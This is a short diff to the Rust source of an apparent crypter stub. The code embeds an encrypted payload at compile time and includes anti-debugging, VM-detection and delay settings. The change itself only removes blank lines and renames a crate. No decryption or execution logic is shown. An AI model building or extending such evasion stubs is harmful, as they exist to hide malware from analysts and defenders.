@@ -1,8 +1,6 @@
 mod generated;
 use generated::{KEY, NONCE, DELAY_SECS, VERBOSE, VM_DETECTION};
-
 use aes_gcm::{Aes256Gcm, Key, Nonce, aead::{Aead, KeyInit}};
-
 // Embedded at compile time by the crypter.
 static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");
 static PADDING: &[u8] = include_bytes!("../padding.bin");
@@ -18,7 +16,7 @@ fn debugger_detected() -> bool {
     // WARNING: unreliable standalone anti-debug check.
     // The crate's heuristics can be outdated, bypassed, or produce
     // false negatives on modern or custom-configured VMs.
-    antidebug::is_debugger_present().unwrap_or(false)
+    anti_debug::is_debugger_present().unwrap_or(false)
 }
 
 fn decompress() -> Vec<u8> {
